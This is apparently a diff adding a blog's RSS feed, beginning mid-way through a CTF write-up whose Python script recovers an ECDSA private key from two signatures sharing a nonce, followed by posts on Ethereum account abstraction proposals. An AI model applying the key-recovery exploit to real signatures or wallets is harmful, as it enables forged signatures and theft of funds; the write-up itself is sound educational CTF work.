+&lt;p&gt;A little more searching around turned up a plethora of git repositories claiming to be able to extract a private key based on this vulnerability. A few moments later, and I had this script:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;ecdsa &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;ecdsa, SigningKey
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;ecdsa.numbertheory &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;inverse_mod
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;hashlib &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;sha1
+
+g = ecdsa.generator_secp256k1
+publicKeyOrderInteger = g.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;()
+
+r = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;e430b3a398f2320556eef81c1c523ea5ae0a920f493c8376eafcb0dc9cd75b89&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+sA = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;4a19d0b156a9d10b0a86b729316909cdc8634ec23aa38f5f891e2599fc316a81&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+sB = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;43d8ec82d7b6b1f3c8ed41b0ba682d5291f6d4a922a57729fa716dccd0f237d6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+
+hashA = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;24281772548044994405505787307091019721595367071300198475142035580469771474091&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+hashB = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;56710668495515998944273818574660611208941006033402527734960197520384934694586&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;
+
+r1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(r, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+s1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(sA, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+s2 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(sB, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#Convert Hex into Int
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;L1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(hashA, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+L2 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(hashB, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+
+numerator = (((s2 * L1) % publicKeyOrderInteger) - ((s1 * L2) % publicKeyOrderInteger))
+denominator = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;inverse_mod&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(r1 * ((s1 - s2) % publicKeyOrderInteger), publicKeyOrderInteger)
+
+privateKey = numerator * denominator % publicKeyOrderInteger
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(privateKey)
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The constants:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;g&lt;&#x2F;code&gt; is the particular curve that &lt;code&gt;chal.py&lt;&#x2F;code&gt; used.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;r&lt;&#x2F;code&gt; is the shared value from the two signatures.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;sA&lt;&#x2F;code&gt; and &lt;code&gt;sB&lt;&#x2F;code&gt; are the &lt;code&gt;s&lt;&#x2F;code&gt; values from the two signatures.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;hashA&lt;&#x2F;code&gt; and &lt;code&gt;hashB&lt;&#x2F;code&gt; are the outputs of &lt;code&gt;hash_message&lt;&#x2F;code&gt; in the original script, for the given inputs.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The output:&lt;&#x2F;p&gt;
+&lt;pre&gt;
+82639917221039576394263609841358608750060353480659277072454055536914923163809
+&lt;&#x2F;pre&gt;
+&lt;p&gt;Hack that back into the original program (by modifying &lt;code&gt;gen_keypair&lt;&#x2F;code&gt;) and you can sign arbitrary messages! &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#5&quot;&gt;5&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h1&gt;
+&lt;p&gt;Well, that&#x27;s it! That&#x27;s all of BABYCRYPTO. Stay tuned for two more posts on the BROKER and BABYREV challenges.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;footnotes&quot;&gt;Footnotes&lt;&#x2F;h2&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;Although I wasn&#x27;t part of the subcommittee on team naming, I&#x27;m pretty sure dilicious is just diligence plus delicious.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
+&lt;p&gt;It took me longer than I care to admit to realize that diligence is actually ConsenSys Diligence, and my confusion explains why &lt;a href=&quot;.&#x2F;dill.jpg&quot;&gt;this&lt;&#x2F;a&gt; was our Discord server&#x27;s icon, instead of something relevant.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;3&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;3&lt;&#x2F;sup&gt;
+&lt;p&gt;Actually part of ConsenSys Quilt, not Diligence.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;4&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;4&lt;&#x2F;sup&gt;
+&lt;p&gt;I&#x27;ve been informed that the Docker containers would&#x27;ve let us test solutions locally, but I still assert they were a red herring.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;5&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;5&lt;&#x2F;sup&gt;
+&lt;p&gt;Apologies if you were looking for any in-depth analysis of how the ECDSA private key recovery actually works. You can find the repository I used as a starting point &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Marsh61&#x2F;ECDSA-Nonce-Reuse-Exploit-Example&#x2F;blob&#x2F;master&#x2F;Attack-Main.py&quot;&gt;here&lt;&#x2F;a&gt;. It has comments!&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>🅰️🅰️ Account Abstraction Beyond EIP-2938 🧵🎉</title>
+                <pubDate>Tue, 13 Oct 2020 06:53:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/beyond-account-abstraction/</link>
+                <guid>https://binarycake.ca/posts/beyond-account-abstraction/</guid>
+                <description>&lt;p&gt;&lt;em&gt;Originally posted on &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@SamWilsn&#x2F;S1UQDOzBv&quot;&gt;hackmd.io&lt;&#x2F;a&gt;.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;em&gt;Special thanks to &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt; and the rest of the Quilt team for review, content, and editing!&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;more-account-abstraction&quot;&gt;More Account Abstraction?&lt;&#x2F;h2&gt;
+&lt;p&gt;If you haven&#x27;t yet, read &lt;a href=&quot;https:&#x2F;&#x2F;binarycake.ca&#x2F;posts&#x2F;account-abstraction-explained&#x2F;&quot;&gt;EIP-2938 Account Abstraction Explained&lt;&#x2F;a&gt; for some background on account abstraction (AA) and how &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2938.md&quot;&gt;EIP-2938&lt;&#x2F;a&gt; implements it. To quickly summarize it here, EIP-2938 implements just enough AA to support single-tenant applications, with &lt;em&gt;minimal&lt;&#x2F;em&gt; consensus changes and some new transaction propagation rules.&lt;&#x2F;p&gt;
+&lt;p&gt;While the EIP lays the groundwork for AA and does provide a compelling solution for single-tenant use cases, like smart contract wallets, several use cases are not satisfied and require new features to be fully realized.&lt;&#x2F;p&gt;
+&lt;!--
+## Use Cases
+
+Several use cases benefit substantially from AA, and are summarized below along with some example implementations and the difficulties they face in current Ethereum.
+
+### Smart Contract Wallet
+
+Smart contract wallets bring the features of smart contracts to user accounts. Historically they are limited because only externally owned accounts (EOAs) can initiate transactions. [Gnosis Safe](https:&#x2F;&#x2F;gnosis-safe.io&#x2F;) is a popular example.
+
+### Mixer
+
+Mixers, like [Tornado.cash](http:&#x2F;&#x2F;tornado.cash&#x2F;), increase privacy by depositing funds of several people into a single pool and obfuscating the link between the depositor and the person withdrawing. The privacy of mixers in current Ethereum is somewhat compromised because withdrawing from a mixer requires funds to pay for gas, and those funds can be linked to a particular person. AA sidesteps the problem, and instead lets the mixer contract pay for gas itself.
+
+### Arbitrage
+
+Arbitrageurs compete to make trades to take advantage of price differences. Many of the transactions to execute these trades get reverted once the price differences are reconciled, wasting gas and exacerbating market inefficiency. [Uniswap](https:&#x2F;&#x2F;uniswap.org&#x2F;)&#x27;s liquidity pools present an opportunity for arbitrage.
+
+With AA, market contracts can define transaction validity rules that invalidate rejected trade transactions, instead of simply reverting them. The invalidated transactions cost no gas, and occupy no block space.
+
+--&gt;
+&lt;h2 id=&quot;features-beyond-eip-2938&quot;&gt;Features Beyond EIP-2938&lt;&#x2F;h2&gt;
+&lt;p&gt;Building upon the foundations of EIP-2938, there are several more features that can be implemented.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;proxy-contracts-with-delegatecall&quot;&gt;Proxy Contracts with &lt;code&gt;DELEGATECALL&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;Smart contract wallets often support upgradability by proxying calls to another contract. EIP-2938 alone does not support &lt;code&gt;DELEGATECALL&lt;&#x2F;code&gt; before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; because the target of the call may be destroyed, potentially invalidating a large number of pending transactions.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-do-we-get-it&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;Described in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2937.md&quot;&gt;EIP-2937&lt;&#x2F;a&gt;, the &lt;code&gt;SET_INDESTRUCTIBLE&lt;&#x2F;code&gt; opcode conveniently prevents a contract from calling &lt;code&gt;SELFDESTRUCT&lt;&#x2F;code&gt;. EIP-2937 is a fairly minimal change, and is useful with or without AA.&lt;&#x2F;p&gt;
+&lt;p&gt;To safely enable &lt;code&gt;DELEGATECALL&lt;&#x2F;code&gt; before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; from AA contracts, a node would check the first opcode of the library (callee) contract, and proceed if and only if it is &lt;code&gt;SET_INDESTRUCTIBLE&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;This lets AA contracts call out to libraries before &lt;code&gt;PAYGAS&lt;&#x2F;code&gt; to determine transaction validity. These libraries could be loaded from a dynamic address, enabling upgradability of the validation logic!&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;read-only-calls-with-staticcall&quot;&gt;Read-only Calls with &lt;code&gt;STATICCALL&lt;&#x2F;code&gt;&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want-1&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;External read-only calls into an AA contract, like &lt;code&gt;eth_call&lt;&#x2F;code&gt;, are generally useful. Getting your account balance, the conversion rate between tokens, and simply reading your nonce are all incredibly common operations that use &lt;code&gt;STATICCALL&lt;&#x2F;code&gt;. The bytecode prefix in the EIP immediately stops all incoming calls, including static ones.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-do-we-get-it-1&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;Enabling &lt;code&gt;STATICCALL&lt;&#x2F;code&gt; is as simple as adding a new opcode &lt;code&gt;IS_STATIC&lt;&#x2F;code&gt; that returns true if the current frame of execution is read-only, and amending the AA bytecode prefix to allow external calls if &lt;code&gt;IS_STATIC&lt;&#x2F;code&gt; is true. Read-only calls cannot modify state, and therefore cannot invalidate other transactions.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;read-write-calls&quot;&gt;Read-write Calls&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want-2&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;Read-only calls are great and all, but what about writing state into AA contracts from non-AA transactions? The most basic use case here is depositing ETH&#x2F;tokens into a multi-tenant AA contract&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#utxo&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;, which requires updating a particular user&#x27;s balance within the contract.&lt;&#x2F;p&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;utxo&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;Deposits are possible even without read-write calls, but it&#x27;s a bit of a &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@SamWilsn&#x2F;B1c0ZdaGP&quot;&gt;kludge&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;h4 id=&quot;how-do-we-get-it-2&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;The restrictions imposed by the EIP are designed to establish a ratio between how much an attacker has to spend in gas fees versus how many pending transactions are invalidated. The major problem with allowing read-write calls is that a single mined transaction could call into many AA contracts and invalidate their pending transactions, skewing this ratio. If the same ratio were to be preserved, read-write calls would be safe.&lt;&#x2F;p&gt;
+&lt;p&gt;To this end, we introduce a new opcode &lt;code&gt;RESERVE_GAS&lt;&#x2F;code&gt;, taking one argument &lt;code&gt;N&lt;&#x2F;code&gt;, which guarantees a call consumes at least &lt;code&gt;N&lt;&#x2F;code&gt; gas. The exact specifics of how this opcode is implemented are still being specified (refund counter vs. a new counter.) Then we standardize an additional bytecode prefix for AA contracts which uses the new &lt;code&gt;RESERVE_GAS&lt;&#x2F;code&gt; opcode when called externally to enforce a minimum gas usage.&lt;&#x2F;p&gt;
+&lt;p&gt;If calling into an AA contract is at least as expensive as targeting that contract directly, non-AA transactions can&#x27;t invalidate any more transactions than directly targeting those contracts would have.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;multiple-pending-transactions&quot;&gt;Multiple Pending Transactions&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want-3&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;Every multi-tenant&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; use case (mixer, arbitrage, etc) requires that multiple transactions targeting the same AA contract propagate through the network simultaneously. Imagine having to send a transaction repeatedly to compete for the next nonce value, instead of just sending it and walking away.&lt;&#x2F;p&gt;
+&lt;p&gt;EIP-2938 only propagates a single transaction at a time, and while &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@SamWilsn&#x2F;B1c0ZdaGP&quot;&gt;bundling transactions&lt;&#x2F;a&gt; does provide a partial workaround, the drawbacks make it impractical.&lt;&#x2F;p&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;2&lt;&#x2F;sup&gt;
+&lt;p&gt;Meaning in use by multiple external uncoordinated actors—human or not—at the same time.&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;h4 id=&quot;how-do-we-get-it-3&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;There are three problem areas that need to be solved before we can have multiple pending transactions per AA contract.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;replay-protection-transaction-hash-uniqueness&quot;&gt;Replay Protection &amp;amp; Transaction Hash Uniqueness&lt;&#x2F;h5&gt;
+&lt;p&gt;Replay protection is the defense against another party taking your transaction and resending it after it has already been included in a block. Since the transaction fields don&#x27;t change, without some external mechanism, the transaction remains valid. The nonce field in transactions serves that purpose today. As a secondary effect, the strictly-increasing nonce also guarantees that each transaction has a unique hash. As the signature covers all of the fields, including the nonce, another party cannot change the nonce without invalidating the transaction.&lt;&#x2F;p&gt;
+&lt;p&gt;AA contracts, however, are free to choose what fields their signature scheme covers. They can, therefore, ignore the protocol nonce and define their own (or no) replay protection mechanism.&lt;&#x2F;p&gt;
+&lt;p&gt;EIP-2938 handles nonces the same way as traditional transactions. Unfortunately using the nonce supplied when the transaction was created falls apart when there are pending transactions from multiple uncoordinated users. Once one of these transactions is mined, the contract&#x27;s nonce increments and the rest of the pending transactions are dropped, even if the contract might still consider them valid.&lt;&#x2F;p&gt;
+&lt;p&gt;To enable multi-tenant applications, whenever an AA contract&#x27;s nonce changes, nodes &amp;quot;fix&amp;quot; the nonce of any pending transactions and revalidate them. For contracts with their own replay protection mechanism, this relegates the protocol nonce to the role of preserving hash uniqueness for transactions included in a block, effectively creating two distinct hashes&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; for each transaction:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;The &lt;em&gt;inclusion hash&lt;&#x2F;em&gt;, which is a new name for the traditional hash including the nonce. It uniquely refers to a particular transaction once mined, in a particular block, at a particular index within that block; and&lt;&#x2F;li&gt;
+&lt;li&gt;The &lt;em&gt;nonceless hash&lt;&#x2F;em&gt;, which is a hash that refers to one or possibly more transactions, which may be propagating or included in a block.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Clients would likely have to provide an API endpoint for converting between the two hashes.&lt;&#x2F;p&gt;
+&lt;p&gt;With malleable nonces comes additional validation effort every time a new block arrives. Pending transactions are revalidated after new blocks are validated, but this work isn&#x27;t &lt;em&gt;part&lt;&#x2F;em&gt; of block validation. Ideally all pending transactions can be revalidated before the next block arrives, and nodes can guarantee this by limiting how much cumulative validation gas each AA contract can consume. Quilt has &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;dos-vectors-in-account-abstraction-aa-or-validation-generalization-a-case-study-in-geth&#x2F;7937&quot;&gt;measured&lt;&#x2F;a&gt; how different validation gas limits affect revalidation time, showing that even with generous gas limits, nodes should easily be able to complete revalidation in time.&lt;&#x2F;p&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;2&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;3&lt;&#x2F;sup&gt;
+&lt;p&gt;Accepting proposals for better names!&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;h5 id=&quot;amplification-attacks&quot;&gt;Amplification Attacks&lt;&#x2F;h5&gt;
+&lt;p&gt;If an attacker spams non-AA transactions to the network, causing nodes to waste resources validating them, eventually a large portion of those transactions will make it into mined blocks, costing the attacker real money. Transactions with a low gas price get evicted from the pending pool, creating a price floor for this kind of attack.&lt;&#x2F;p&gt;
+&lt;p&gt;For AA, a single mined transaction could invalidate many pending transactions, none of which make it into mined blocks, and therefore cost an attacker nothing. This is why the propagation rules in EIP-2938 are so restrictive.&lt;&#x2F;p&gt;
+&lt;p&gt;The same simple solution above (a cumulative validation gas limit) mitigates amplification attacks as well. An attacker can still spam the network, but there is a clear bound on the ratio of validation work vs. paid transactions included in blocks. Quilt has done &lt;a href=&quot;https:&#x2F;&#x2F;ethresear.ch&#x2F;t&#x2F;dos-vectors-in-account-abstraction-aa-or-validation-generalization-a-case-study-in-geth&#x2F;7937&quot;&gt;extensive work&lt;&#x2F;a&gt; indicating that, with reasonable bounds, nodes will remain able to cope with worst case validation load.&lt;&#x2F;p&gt;
+&lt;h5 id=&quot;crowding-out-transactions&quot;&gt;Crowding Out Transactions&lt;&#x2F;h5&gt;
+&lt;p&gt;Whether it&#x27;s because of hardware constraints, or the cumulative gas limit mentioned above, nodes are only able to keep and propagate a limited number of transactions per AA contract. If nodes order pending AA transactions naively by gas price, a malicious user could crowd out other users by sending many high paying, mutually exclusive transactions targeting the AA contract. Only one of the attacker&#x27;s transactions would make it on chain, reducing the contract&#x27;s throughput at a low cost to the attacker.&lt;&#x2F;p&gt;
+&lt;p&gt;Including an &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2930.md&quot;&gt;EIP-2930&lt;&#x2F;a&gt;-style state access list and making it binding (state accesses outside the list fail) gives nodes enough information to effectively propagate multiple transactions. Transactions with disjoint access lists cannot invalidate each other, and are always safe to propagate. If two transactions&#x27; access lists intersect, nodes choose the one with a higher gas fee.&lt;&#x2F;p&gt;
+&lt;p&gt;This approach is only sketched out in the EIP, and needs further research.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;pure-validation-logic&quot;&gt;Pure Validation Logic&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want-4&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;Multiple pending transactions introduce the need to occasionally revalidate transactions. Some validation schemes (like zero-knowledge proofs) have a large one-time cost (to validate the proof) which cannot be invalidated by state or environment changes. If nodes are able to run these validation steps and cache the result, they can avoid the recurring cost during revalidation and safely enable higher validation gas limits.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-do-we-get-it-4&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;Building upon the &lt;code&gt;IS_STATIC&lt;&#x2F;code&gt; opcode and &lt;code&gt;STATICCALL&lt;&#x2F;code&gt;s into AA contracts from above, pure validation logic can be separated from regular validation and cached by standardizing a particular bytecode prefix, roughly implementing:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#c0c5ce;&quot;&gt;if (msg.sender == 0xffffffffffffffffffffffffffffffffffffffff) {
+    let result = STATICCALL(this); &#x2F;&#x2F; Or alternatively PURECALL
+    return CALL(this, result);
+} else if (msg.sender == address(this)) {
+    if (IS_STATIC()) {             &#x2F;&#x2F; Or alternatively IS_PURE
+        let result = &#x2F;* do one time validation *&#x2F;
+        return result;
+    }
+} else {
+    LOG1(msg.sender, msg.value);
+    return;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;If the AA contract reads from state or the environment during the initial &lt;code&gt;STATICCALL&lt;&#x2F;code&gt;, the node would disable caching and revert to the lower validation gas limit. Instead of handling these state reads as a special case, this behavior could be standardized with newly introduced opcodes &lt;code&gt;PURECALL&lt;&#x2F;code&gt; and &lt;code&gt;IS_PURE&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;In slightly more human-friendly terms, the contract first &lt;code&gt;STATICCALL&lt;&#x2F;code&gt;s itself to perform the pure validation step. Then the contract calls itself, supplying the result of the static call (which can be cached by the node), to do the state-dependent portion of the validation, invoke &lt;code&gt;PAYGAS&lt;&#x2F;code&gt;, and perform the rest of execution. Passing the cached value back to the contract during later revalidations could reuse the existing implementation of contract calls.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;sponsored-transactions&quot;&gt;Sponsored Transactions&lt;&#x2F;h3&gt;
+&lt;h4 id=&quot;what-do-we-want-5&quot;&gt;What do we want?&lt;&#x2F;h4&gt;
+&lt;p&gt;Sponsored transactions, in the context of AA, are essentially setting &lt;code&gt;msg.sender&lt;&#x2F;code&gt; to a value other than the AA contract itself. Relayers could use sponsored transactions to act on behalf of the relayed account.&lt;&#x2F;p&gt;
+&lt;h4 id=&quot;how-do-we-get-it-5&quot;&gt;How do we get it?&lt;&#x2F;h4&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereum&#x2F;EIPs&#x2F;blob&#x2F;master&#x2F;EIPS&#x2F;eip-2711.md&quot;&gt;EIP-2711&lt;&#x2F;a&gt;&#x27;s specification of sponsored transactions is, unfortunately, incompatible with AA because it enshrines the signature format for sponsored transactions. As an alternative, we propose a new precompile that recovers a signature over the call data, and sets &lt;code&gt;msg.sender&lt;&#x2F;code&gt; appropriately.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;the-end&quot;&gt;The End?&lt;&#x2F;h2&gt;
+&lt;p&gt;With only a handful of consensus changes and transaction pool rules, account abstraction goes from barely enough to support smart contract wallets to supporting exciting multi-tenant applications like mixers and exchanges.&lt;&#x2F;p&gt;
+&lt;p&gt;Is account abstraction still not handling your use case? Doubt this is feasible? Come discuss with us in the &lt;a href=&quot;https:&#x2F;&#x2F;discord.gg&#x2F;GU55yAW&quot;&gt;#account-abstraction&lt;&#x2F;a&gt; channel over at the Eth R&amp;amp;D Discord!&lt;&#x2F;p&gt;
+</description>
+            </item>
+        
+            <item>
+                <title>🅰️🅰️ EIP-2938 Account Abstraction Explained 🧵👟</title>
+                <pubDate>Thu, 17 Sep 2020 23:40:00 +0000</pubDate>
+                <link>https://binarycake.ca/posts/account-abstraction-explained/</link>
+                <guid>https://binarycake.ca/posts/account-abstraction-explained/</guid>
+                <description>&lt;p&gt;&lt;em&gt;Originally posted on &lt;a href=&quot;https:&#x2F;&#x2F;hackmd.io&#x2F;@SamWilsn&#x2F;ryhxoGp4D&quot;&gt;hackmd.io&lt;&#x2F;a&gt;.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;what-is-account-abstraction&quot;&gt;What is Account Abstraction&lt;&#x2F;h2&gt;
+&lt;p&gt;As of the Muir Glacier hard-fork, out of Ethereum&#x27;s two kinds of accounts—externally owned accounts (EOAs, like your MetaMask wallet) and smart contracts—only EOAs may pay gas fees for transactions. Lifting that restriction and allowing custom validity logic is, at an extremely high level, Account Abstraction (AA).&lt;&#x2F;p&gt;
